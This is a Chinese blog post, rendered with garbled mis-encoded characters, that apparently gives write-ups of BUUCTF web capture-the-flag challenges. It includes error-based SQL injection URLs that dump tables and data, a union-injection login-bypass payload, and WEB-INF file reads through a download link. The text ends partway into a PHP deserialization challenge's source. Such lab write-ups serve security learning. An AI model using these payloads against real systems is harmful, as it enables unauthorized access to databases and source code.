<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ç™¾é“CTFåˆ·é¢˜è®°å½•(å››)ä¹‹BUUCTF | Yunen's Blog</title><meta name="description" content="æœ€è¿‘å¥½ä¹…æ²¡åˆ·CTFé¢˜äº†ï¼Œå…¶å®BUUCTFè¿™ä¸ªå¹³å°æˆ‘ä¹Ÿæ˜¯æœ€å¼€å§‹çš„ç”¨æˆ·ä¹‹ä¸€(uidå‰20ï¼Œæ‡’ç‹—çŸ³é”¤äº†...)ï¼Œå¯æ˜¯ä¸€ç›´æ²¡æœ‰æ—¶é—´èƒ½å¤Ÿå¥½å¥½çš„åˆ·é¢˜ï¼Œä»Šå„¿æ€»ç®—æ—¶é—´å……è£•ï¼Œæ‰“ç®—èŠ±äº›æ—¶æ—¥ï¼Œè®°å½•ä¸‹è‡ªå·±åœ¨BUUåˆ·é¢˜çš„ç»éªŒã€‚"><meta name="keywords" content="CTF,BUUCTF,Writeup,æå®¢å¤§æŒ‘æˆ˜ 2019 HardSQL,GXYCTF2019 BabySQli,RoarCTF 2019 Easy Java,ç½‘é¼æ¯ 2020 é’é¾™ç»„ AreUSerialz,BUUCTF 2018 Online Tool,GYCTF2020 Blacklist,BJDCTF 2nd old-hack,De1CTF 2019 SSRF Me,GKCTF2020 cveç‰ˆç­¾åˆ°,GXYCTF2019 ç¦æ­¢å¥—å¨ƒ,MRCTF2020 ä½ ä¼ ä½ ğŸå‘¢,å®‰æ´µæ¯ 2019 easy_web,MRCTF2020 Ez_bypass,BJDCTF2020 Mark loves cat,GWCTF 2019 æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“,GXYCTF2019 BabyUpload"><meta name="author" content="Yunen"><meta name="copyright" content="Yunen"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.0x002.com/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><meta property="og:type" content="article"><meta property="og:title" content="ç™¾é“CTFåˆ·é¢˜è®°å½•(å››)ä¹‹BUUCTF"><meta property="og:url" content="https://www.0x002.com/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/"><meta property="og:site_name" content="Yunen's Blog"><meta property="og:description" content="æœ€è¿‘å¥½ä¹…æ²¡åˆ·CTFé¢˜äº†ï¼Œå…¶å®BUUCTFè¿™ä¸ªå¹³å°æˆ‘ä¹Ÿæ˜¯æœ€å¼€å§‹çš„ç”¨æˆ·ä¹‹ä¸€(uidå‰20ï¼Œæ‡’ç‹—çŸ³é”¤äº†...)ï¼Œå¯æ˜¯ä¸€ç›´æ²¡æœ‰æ—¶é—´èƒ½å¤Ÿå¥½å¥½çš„åˆ·é¢˜ï¼Œä»Šå„¿æ€»ç®—æ—¶é—´å……è£•ï¼Œæ‰“ç®—èŠ±äº›æ—¶æ—¥ï¼Œè®°å½•ä¸‹è‡ªå·±åœ¨BUUåˆ·é¢˜çš„ç»éªŒã€‚"><meta property="og:image" content="https://img.0x002.com/article/BuuCTF3/cover.png"><meta property="article:published_time" content="2020-09-17T13:00:00.000Z"><meta property="article:modified_time" content="2020-09-17T13:53:58.875Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="next" title="2020é‡åº†å¸‚æ•™è‚²ç³»ç»Ÿç½‘ç»œå®‰å…¨æ”»é˜²ç«èµ›å†³èµ› - Web Writeup" href="https://www.0x002.com/2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?33ecfad176b3600bd31dce47459394e6";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç®€"},
  noticeOutdate: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  bookmark: {
    message_prev: 'æŒ‰',
    message_next: 'é”®å°†æœ¬é¡µåŠ å…¥ä¹¦ç­¾'
  },
  runtime_unit: 'å¤©',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: true    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2020-09-17 21:53:58'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://img.0x002.com/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length_num">30</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length_num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list"></i><span> å…¶ä»–</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> ä¹¦ç±</span></a></li><li><a class="site-page" href="/project/"><i class="fa-fw fas fa-code"></i><span> é¡¹ç›®</span></a></li><li><a class="site-page" href="/navigation/"><i class="fa-fw fas fa-link"></i><span> å¯¼èˆª</span></a></li></ul></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#å‰è¨€"><span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#æ­£æ–‡"><span class="toc-text">æ­£æ–‡</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><span class="toc-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><span class="toc-text">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ³•ä¸€ï¼šphp7-1-ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ"><span class="toc-text">æ³•ä¸€ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ³•äºŒï¼šä½¿ç”¨16è¿›åˆ¶ç»•è¿‡"><span class="toc-text">æ³•äºŒï¼šä½¿ç”¨16è¿›åˆ¶ç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-old-hack"><span class="toc-text">[BJDCTF 2nd]old-hack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-cveç‰ˆç­¾åˆ°"><span class="toc-text">[GKCTF2020]cveç‰ˆç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><span class="toc-text">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><span class="toc-text">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å®‰æ´µæ¯-2019-easy-web"><span class="toc-text">[å®‰æ´µæ¯ 2019]easy_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-text">[BJDCTF2020]Mark loves cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ³•ä¸€"><span class="toc-text">æ³•ä¸€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ³•äºŒ"><span class="toc-text">æ³•äºŒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><span class="toc-text">[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://img.0x002.com/article/BuuCTF3/cover.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Yunen's Blog</a></span><span class="pull-right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list"></i><span> å…¶ä»–</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> ä¹¦ç±</span></a></li><li><a class="site-page" href="/project/"><i class="fa-fw fas fa-code"></i><span> é¡¹ç›®</span></a></li><li><a class="site-page" href="/navigation/"><i class="fa-fw fas fa-link"></i><span> å¯¼èˆª</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">ç™¾é“CTFåˆ·é¢˜è®°å½•(å››)ä¹‹BUUCTF</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date" title="å‘è¡¨äº 2020-09-17 21:00:00"><i class="fa-fw far fa-calendar-alt"></i> å‘è¡¨äº 2020-09-17</time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/">åŸåˆ›æ ç›®</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta__icon"></i><span>å­—æ•°æ€»è®¡:</span><span class="word-count">4.8k</span><span class="post-meta__separator">|</span><i class="far fa-clock fa-fw post-meta__icon"></i><span>é˜…è¯»æ—¶é•¿: 22 åˆ†é’Ÿ</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ¥ä¸Šç¯‡ï¼Œç»§ç»­åˆ·é¢˜</p>
<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>è€ƒç‚¹ï¼šæŠ¥é”™æ³¨å…¥ã€‚è¿‡æ»¤äº†<code>ç©ºç™½å­—ç¬¦ã€=</code>ç­‰</p>
<p>EXPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># å–è¡¨å</span><br><span class="line">check.php?username&#x3D;1&amp;password&#x3D;1%27^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())),0x7e),1)%23</span><br><span class="line"></span><br><span class="line"># å–åˆ—å</span><br><span class="line">check.php?username&#x3D;1&amp;password&#x3D;1%27^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(database())),0x7e),1)%23</span><br><span class="line"></span><br><span class="line"># è¯»æ•°æ®</span><br><span class="line">check.php?username&#x3D;1&amp;password&#x3D;1%27^updatexml(1,concat(0x7e,(select(group_concat(id,password,username))from(H4rDsq1)),0x7e),1)%23</span><br><span class="line"></span><br><span class="line"># è¯»å–ä¸å…¨ä½¿ç”¨right()å–å³è¾¹éƒ¨åˆ†å†…å®¹</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>ç™»å½•æ³¨å…¥é¢˜ã€‚</p>
<p>è€è§„çŸ©ï¼Œå…ˆåˆ†åˆ«ä½¿ç”¨å•å¼•å·è¯•æŠ¥é”™ï¼Œé¡ºä¾¿çœ‹çœ‹pwå‚æ•°æœ‰æ— å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼ˆä¸å¸¸è§ç™»å½•éªŒè¯åˆ¤æ–­æœ‰å…³ï¼‰ã€‚</p>
<p>å°è¯•åå‘ç°ï¼Œuserå‚æ•°æŠ¥é”™ï¼Œpwä¸æŠ¥é”™ã€‚</p>
<p>çŒœæµ‹åç«¯éªŒè¯é€»è¾‘åº”è¯¥æ˜¯å…ˆé€šè¿‡ç”¨æˆ·åæŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯ï¼Œå†ä¸pwå‚æ•°åšæ¯”è¾ƒã€‚</p>
<p>å¯¹äºè¿™ç§éªŒè¯ç æ–¹æ³•æˆ‘ä»¬é€šå¸¸é‡‡ç”¨è”åˆæ³¨å…¥æ³•ï¼Œé€šè¿‡æ§åˆ¶è¿”å›å†…å®¹æ¥ç»•è¿‡ç™»å½•ã€‚</p>
<p>EXPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search.php</span><br><span class="line"></span><br><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;%23&amp;pw&#x3D;123</span><br></pre></td></tr></table></figure>
<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°é¡µé¢å­˜åœ¨ä¸€ä¸ªå¥‡æ€ªé“¾æ¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"Download?filename=help.docx"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>help<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>çœ‹æ ·å­åº”è¯¥æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œåªä¸è¿‡ä¸çŸ¥é“èƒ½ä¸èƒ½è·¨ç›®å½•å‡ºå»è¯»å–å…¶ä»–æ–‡ä»¶ã€‚</p>
<p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè„‘æ´ï¼Œç›´æ¥GETä¼šæŠ¥é”™ï¼Œæ”¹æ¢POSTè®¿é—®æ‰è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸ªâ€œè„‘æ´â€ï¼Œè®©æˆ‘ä»¬å¾—çŸ¥æ­¤é¢˜çš„åç«¯ç¨‹åºæ˜¯javaã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œå¯¹äºjavaçš„webå¼€å‘ï¼ŒWEB-INFæ–‡ä»¶å¤¹è‡³å…³é‡è¦ï¼Œå…¶ä¸­çš„web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>
<blockquote>
<p>/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classã€‚<br>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ã€‚</p>
<p><strong>åˆ©ç”¨</strong>ï¼š<br>é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶è·¯å¾„ï¼Œæœ€åä¸‹è½½classæ–‡ä»¶ï¼Œé€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</p>
<p>æ‘˜è‡ªï¼š<a href="http://sunu11.com/2017/04/28/11/" target="_blank" rel="noopener">Webæºç æ³„éœ²æ€»ç»“</a></p>
</blockquote>
<p>æ•…æˆ‘ä»¬è¯»å–/WEB-INF/web.xmlã€‚</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200902010912503.png" alt="è¯»å–web.xml"></p>
<p>æ ¹æ®å‘½åè§„åˆ™æˆ‘ä»¬æ¨æ–­è¯¥classå¯¹åº”çš„å­—èŠ‚ç æ–‡ä»¶åº”å­˜æ”¾åœ¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class</span><br></pre></td></tr></table></figure>
<p>è¯»å–åå¾—åˆ°flagï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200902011024719.png" alt="è¯»å–flag"></p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) 